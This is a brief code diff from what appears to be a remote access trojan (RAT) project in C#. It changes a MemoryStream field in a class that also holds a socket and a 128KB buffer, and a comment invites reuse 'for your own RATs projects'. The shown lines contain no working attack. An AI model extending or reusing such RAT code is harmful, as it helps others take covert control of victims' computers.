@@ -78,7 +78,7 @@ namespace SV
         public class infoAl : IDisposable
         {
             // feel free to use this class for your own RATs projects (: - qH0sT.
-            public static MemoryStream memos = new MemoryStream();
+            MemoryStream memos = new MemoryStream();
             byte[] dataByte = new byte[131072]; //128KB
             int blockSize = 131072;
             Socket tmp = default;
